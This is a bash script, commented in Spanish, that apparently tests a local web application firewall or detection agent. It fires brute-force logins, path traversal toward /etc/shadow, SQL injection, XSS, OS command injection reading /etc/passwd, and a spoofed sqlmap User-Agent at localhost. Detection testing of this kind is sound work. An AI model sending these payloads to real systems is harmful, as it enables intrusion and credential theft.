#!/bin/bash
TARGET_HOST="localhost"
TARGET_PORT="3001"
BASE_URL="http://$TARGET_HOST:$TARGET_PORT"

echo "[*] Atacante: Iniciando secuencia de prueba controlada..."

echo "[+] 1. Disparando Fuerza Bruta (6 intentos al login)..."
for i in {1..6}; do
    curl -s -X POST "$BASE_URL/api/auth/login" -H "Content-Type: application/json" -d '{"username": "admin", "password": "wrong"}' > /dev/null
done
sleep 2

echo "[+] 2. Disparando Directory Traversal (LFI)..."
curl -s -X GET "$BASE_URL/api/auth/login?file=../../../etc/shadow" > /dev/null
sleep 2

echo "[+] 3. Disparando Inyección SQL (SQLi)..."
curl -s -G "$BASE_URL/api/auth/login" --data-urlencode "user=' UNION SELECT null--" > /dev/null
sleep 2

echo "[+] 4. Disparando Cross-Site Scripting (XSS)..."
curl -s -X POST "$BASE_URL/api/auth/login" -H "Content-Type: application/json" -d '{"username": "<script>alert(1)</script>", "password": "123"}' > /dev/null
sleep 2

echo "[+] 5. Disparando OS Command Injection..."
curl -s -G "$BASE_URL/api/auth/login" --data-urlencode "host=localhost; cat /etc/passwd" > /dev/null
sleep 2

echo "[+] 6. Simulando Escáner de Vulnerabilidades (Bot)..."
# Falsificamos la cabecera User-Agent para que el WAF crea que somos SQLMap
curl -s -X GET "$BASE_URL/api/auth/login" -H "User-Agent: sqlmap/1.5.8#dev (http://sqlmap.org)" > /dev/null

echo "----------------------------------------"
echo "[*] Secuencia completada. El agente se detuvo automáticamente."